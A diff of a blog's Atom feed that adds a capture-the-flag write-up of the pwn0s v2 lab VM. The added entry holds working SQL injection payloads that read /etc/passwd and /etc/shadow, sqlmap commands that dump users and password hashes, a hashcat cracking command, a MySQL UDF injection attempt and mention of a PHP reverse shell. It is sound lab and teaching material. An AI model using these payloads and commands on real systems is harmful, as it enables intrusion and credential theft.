@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vulnhub | forelsec]]></title>
   <link href="http://hatRiot.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2014-03-03T00:33:58-07:00</updated>
+  <updated>2014-03-03T01:22:26-07:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -12,6 +12,256 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[solving pwn0s v2]]></title>
+    <link href="http://hatRiot.github.io/blog/2012/08/09/solving-pwn0s-v2/"/>
+    <updated>2012-08-09T01:56:45-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2012/08/09/solving-pwn0s-v2</id>
+    <content type="html"><![CDATA[<p>pwn0sv2 is version two in the pwn0s series (?), and can be found <a href="http://boot2root.info/">here</a> at our good friend g0tmi1k&rsquo;s pentest page.  I previously did a write up on the first version of pwn0s and enjoyed it, so I was excited to see there was another version available.  Forewarning: obvious spoilers.</p>
+
+<p>The zip comes packaged with a README with your standard disclaimer/info affair, along with the static IP.  10.10.10.100 is the set IP address.  I set my BT5 onto the 10.10.10.1/24 subnet and did a quick scan of the box:</p>
+
+<p>```
+Starting Nmap 6.01 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2012-07-14 18:20 CDT
+Nmap scan report for 10.10.10.100
+Host is up (0.00086s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (protocol 2.0)
+| ssh-hostkey: 1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)
+|<em>2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)
+80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
+|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Welcome to this Site!
+MAC Address: 08:00:27:36:5C:EF (Cadmus Computer Systems)
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:kernel:2.6 cpe:/o:linux:kernel:3
+OS details: Linux 2.6.38 &ndash; 3.0
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:kernel</p>
+
+<p>TRACEROUTE
+HOP RTT     ADDRESS
+1   0.86 ms 10.10.10.100
+```</p>
+
+<p>There&rsquo;s that pesky OpenSSH Debian build; we could try hunting for weak keys, but that looks to be a newer version of OpenSSH and likely not to be susceptible to that vulnerability.  Nonetheless, it may be worth keeping in mind as we move forward.  <a href="http://www.debian.org/security/2008/dsa-1571">Here&rsquo;s</a> a link to the old advisory for the curious.</p>
+
+<p>There also appears to be an HTTP website up.  Browsing around that gives us a couple of forms; /login.php and /register.php.  With so few services open, I&rsquo;m given the impression that this is going to be a web vulnerability.  First thing I do in almost every registration field:</p>
+
+<p><img class="center" src="/images/posts/2012/pwnos2_sqli.jpg"></p>
+
+<p>And low and behold, we&rsquo;re vulnerable to SQLi.  And away we go.</p>
+
+<p><img class="center" src="/images/posts/2012/pwnos2_sqli2.jpg"></p>
+
+<p>After playing around with the UNION SELECT&rsquo;s, it finally settled on 8 columns and 4 being the displayed one.  So <code>' UNION SELECT 1,2,3,user(), 4,5,6,7,8;-- -</code></p>
+
+<p>If you try that, you&rsquo;ll notice you can&rsquo;t actually stick the entire thing into the login box.  Busting Burp open will fix that:</p>
+
+<p><img class="center" src="/images/posts/2012/pwnos2_sqli3.jpg"></p>
+
+<p>Which gives us:</p>
+
+<p><img class="center" src="/images/posts/2012/pwnos2_sqli4.jpg"></p>
+
+<p>Fantastic!  This means that the mysql daemon is running as root user.  That makes our SQLi attacks much more dangerous; UDF is now available to us.  Lets explore the system a bit more.</p>
+
+<p>```
+&lsquo; UNION SELECT 1,2,3,version(),5,6,7,8&mdash; &ndash;</p>
+
+<pre><code>  Welcome 5.1.54-1ubuntu4
+</code></pre>
+
+<p>&lsquo; UNION SELECT 1,2,3,database(),5,6,7,8&mdash; &ndash;</p>
+
+<pre><code>  Welcome ch16
+</code></pre>
+
+<p>&lsquo; UNION SELECT 1,2,3,load_file(/etc/passwd),5,6,7,8&mdash; &ndash;</p>
+
+<pre><code>  An error occured(...)
+</code></pre>
+
+<p>```</p>
+
+<p>Looks like they&rsquo;re at the very least escaping slashes.  No problem:</p>
+
+<p>```</p>
+
+<blockquote><p>echo -n &lsquo;/etc/passwd&rsquo; | xxd -ps &ndash;
+2f6574632f706173737764
+&lsquo; UNION SELECT 1,2,3,load_file(0x2f6574632f706173737764),5,6,7,8&mdash; &ndash;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+mysql:x:0:0:MySQL Server,,,:/root:/bin/bash
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+landscape:x:104:110::/var/lib/landscape:/bin/false
+dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash
+echo -n &rsquo;/etc/shadow' | xxd -ps &ndash;
+2f6574632f736861646f77
+&lsquo; UNION SELECT 1,2,3,load_file(0x2f6574632f736861646f77),5,6,7,8&mdash; &ndash;
+Welcome
+```</p></blockquote>
+
+<p>Hm, looks like we can&rsquo;t hit /etc/shadow.  Weird.  Lets move on to rapidly enumerating the back end.  I switched over to sqlmap to give more info on the backend.  We already know the vulnerable form, we know the POST format (from our Burp session), and we know the database (from UNION queries above) so lets plug that in for some interesting stuff.</p>
+
+<p>```</p>
+
+<blockquote><p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=True&rsquo; -p &lsquo;email&rsquo; &mdash;tables -D &lsquo;ch16&rsquo;
+Database: ch16
+Table: users
+```</p></blockquote>
+
+<p>One table.  Let&rsquo;s check it out:</p>
+
+<p>```</p>
+
+<blockquote><p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE&rsquo; -p &lsquo;email&rsquo; &mdash;columns -T &lsquo;users&rsquo; &mdash;dump  <br/>
+```</p></blockquote>
+
+<p>This gave me a single user, &lsquo;Dan&rsquo;, with a user level 0 and his hash: <code>c2c4b4e51d9e23c02c15702c136c3e950ba9a4af</code></p>
+
+<p>I let sqlmap run its own cracker against the hash, then dumped it into oclHashCat:<br/>
+<code>cudaHashCat-plus64 -m 300 -a 3 -n 50 --gpu-watchdog=100 --force hash.txt ?l?l?l?l?l?l?l?l</code></p>
+
+<p>I then dumped database users to see what was there, and what the hashes were (assumed sha1(sha1(pass)), but you never know)</p>
+
+<p>```</p>
+
+<blockquote><p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE&rsquo; -p &lsquo;email&rsquo; &mdash;users
+database management system users [108]:</p>
+
+<pre><code>      [*] 'debian-sys-maint'@'localhost'
+      [*] 'root'@'127.0.0.1'
+      [*] 'root'@'localhost'
+      [*] 'root'@'web'
+</code></pre>
+
+<p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE&rsquo; -p &lsquo;email&rsquo; &mdash;passwords</p>
+
+<pre><code>      [23:11:18] [INFO] fetching database users password hashes
+      [23:11:18] [INFO] the SQL query used returns 4 entries
+      [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"
+      [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"                      
+      [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"                      
+      [23:11:18] [INFO] retrieved: "debian-sys-maint","*9366FE2112E650C8E5523AE337B10A625C727943" 
+</code></pre>
+
+<p>```</p></blockquote>
+
+<p>Pretty much what I expected.  At this point I figured the next best thing to try, with my root privileges and all, is UDF injection.  If you&rsquo;re unfamiliar with UDF&rsquo;s, here&rsquo;s a very brief breakdown: a user defined function is a way to extend the functionality of a database by providing a function that&rsquo;s able to be evaluated by the backend database server.  In our case, we want something akin to an eval() or exec().  This can be done with the lib_mysqludf_sys library.  If you want more information on UDF injection, read <a href="https://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf">this</a> fantastic paper from BlackHat 2009 by Damele.</p>
+
+<p>Our attack method is then this: upload the precompiled library into the MySQL plugin directory, create our custom function, and execute some good stuff (passwd, addusr, whatever).  I first needed to know where the plugin directory was.  A quick <a href="https://dev.mysql.com/doc/refman/5.0/en/server-system-variables.html">google</a> of MySQL system variables gives us an answer:</p>
+
+<p><code>
+' UNION SELECT 1,2,3,@@plugin_dir,5,6,7,8-- -
+Welcome /usr/lib/mysql/plugin
+</code></p>
+
+<p>Now we just need to write our library there and create the functions:</p>
+
+<p><code>
+python sqlmap.py -u 'http://10.10.10.100/login.php' --data='email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE' -p 'email' --file-write=/lib_mysqludf_sys --file-dest=/usr/lib/mysql/plugin/
+CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
+SELECT * FROM information_schema.routines
+</code></p>
+
+<p>The final SELECT there does not return our newly created function.  According to MySQL documentation, we need INSERT privileges.  Do we have them?</p>
+
+<p>```
+[*] &lsquo;root&rsquo;@&lsquo;localhost&rsquo; (administrator) [27]:</p>
+
+<pre><code>            privilege: ALTER
+            privilege: ALTER ROUTINE
+            privilege: CREATE
+            privilege: CREATE ROUTINE
+            privilege: CREATE TEMPORARY TABLES
+            privilege: CREATE USER
+            privilege: CREATE VIEW
+            privilege: DELETE
+            privilege: DROP
+            privilege: EVENT
+            privilege: EXECUTE
+            privilege: FILE
+            privilege: INDEX
+            privilege: INSERT
+            privilege: LOCK TABLES
+            privilege: PROCESS
+            privilege: REFERENCES
+            privilege: RELOAD
+            privilege: REPLICATION CLIENT
+            privilege: REPLICATION SLAVE
+            privilege: SELECT
+            privilege: SHOW DATABASES
+            privilege: SHOW VIEW
+            privilege: SHUTDOWN
+            privilege: SUPER
+            privilege: TRIGGER
+            privilege: UPDATE
+</code></pre>
+
+<p>```</p>
+
+<p>It appears we do.  In fact, it doesn&rsquo;t seem we have write access to anything; we can&rsquo;t even INSERT into any tables.  We&rsquo;ll come back to why this doesn&rsquo;t work in a bit.  For now, I threw a reverse PHP shell on the box for more control.  I used pentestmonkey&rsquo;s great php-reverse-shell, and soon enough had a prompt:</p>
+
+<p><img class="center" src="/images/posts/2012/pwnos2_shell.jpg"></p>
+
+<p>I&rsquo;m going to cut out a lot of my trial/error in finding some of this stuff, but note that there is a blog in /var/www.  This provides Simple PHP Blog, which just so happens to be <a href="http://www.exploit-db.com/search/?action=search&amp;filter_page=1&amp;filter_description=Simple+PHP+Blog&amp;filter_exploit_text=&amp;filter_author=&amp;filter_platform=0&amp;filter_type=0&amp;filter_lang_id=0&amp;filter_port=&amp;filter_osvdb=&amp;filter_cve=">vulnerable</a> to LFI; so there&rsquo;s another attack vector for the reverse PHP shell.  Also note the mysqld is listening on 127.0.0.1, which rules out that complex exploit David Kennedy <a href="http://www.exploit-db.com/exploits/19092/">wrote</a>.  Not to mention we&rsquo;re not in a real term.</p>
+
+<p>Note that there are no privilege escalation vulnerabilities for that kernel or for that Ubuntu distribution.  MySQL does not appear to be UDF-injectable, and even though it&rsquo;s telling us we&rsquo;re root@localhost, we simply don&rsquo;t have it.  It is also worth nothing that an attempt to drop a shell script in /etc/cron.d/ and adding a cron entry got AppArmor a bit upset.</p>
+
+<p>My next step was to see if there were any vulnerable binaries uploaded.</p>
+
+<p><code>
+find $1 -type f -print0 | xargs -0 stat --format '%Y :%y %n' | sort -nr | cut -d: -f2- &gt; /tmp/dump.txt
+</code></p>
+
+<p>This dumped modified files by date, so newest at the top, oldest at the bottom.  After getting through all the modified /proc&rsquo;s, I noticed this monster: fakeroot.  Essentially this emulates a root environment but only allows certain file manipulations.  It can be used to run daemons in an environment that&rsquo;s root-like, but not.  This had to be why my MySQL UDF attempts were not working.  Moving on down the list, I noticed another file: /var/mysqli_connect.php.  Weird, what&rsquo;s a PHP file doing in var?</p>
+
+<p>```</p>
+
+<blockquote><p>cat /var/mysqli_connect.php
+[&hellip;]
+// Set the database access information as constants:
+  DEFINE (&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);
+  DEFINE (&lsquo;DB_PASSWORD&rsquo;, &lsquo;root@ISIntS&rsquo;);
+  DEFINE (&lsquo;DB_HOST&rsquo;, &lsquo;localhost&rsquo;);
+  DEFINE (&lsquo;DB_NAME&rsquo;, &lsquo;ch16&rsquo;);
+[&hellip;]
+```</p></blockquote>
+
+<p>Oh.  That&rsquo;s&hellip;it?  Really?  Knowing that root was permitted to ssh in, I quickly gave it a shot:</p>
+
+<p><img class="center" src="/images/posts/2012/pwnos2_root.jpg"></p>
+
+<p>Yup.  That was it.  I suppose the idea here is that incompetent developers can hard code root passwords into arbitrary PHP files laying around the system, but it just seems like more of a scavenger hunt in the end.  I was really hoping there was some obscure vulnerability in a binary, or some fun MySQL UDF injection I could&rsquo;ve done.</p>
+
+<p>All in all, fun, but once you&rsquo;ve got a shell its an exercise in frustration.  Can&rsquo;t say I didn&rsquo;t learn anything though.</p>
+
+<p>Note:  If you&rsquo;re running BackTrack5 and need certain VirtualBox features (bidirectional clipboard, shared folders, etc.), you&rsquo;ll need to prepare kernel headers first.  Follow <a href="http://www.backtrack-linux.org/wiki/index.php/Preparing_Kernel_Headers">these</a> instructions before installing Guest Additions.  If you&rsquo;ve got it installed, just reinstall them.  You&rsquo;ll know it&rsquo;s successful if you don&rsquo;t get &lsquo;could not find kernel headers&rsquo; errors.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[solving pwn0s]]></title>
@@ -67,7 +317,7 @@
 
 <p>Success!  So now we&rsquo;ve got a valid account on the box.  We see it&rsquo;s an x86 Ubuntu machine on the 2.6.22 kernel.  What can we do?  Well, immediately I recognize a major vulnerability in the kernel version.  A bit of googling will turn up the vmsplice exploit.  The exploit itself is in fact a chaining of three separate, now patched, vulnerabilities in the fs/splice.c module.  I will let the fantastic article at <a href="https://lwn.net/Articles/268783/">lwn</a> describe the vulnerability in more detail, and instead put it to some use here:</p>
 
-<p><img src="/images/posts/2012/vmsplice_root.jpg" title="&lsquo;image&rsquo; &lsquo;iamges&rsquo;" ></p>
+<p><img src="/images/posts/2012/vmsplice_root.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>
 
 <p>And just like that we&rsquo;ve got root on the box.</p>
 
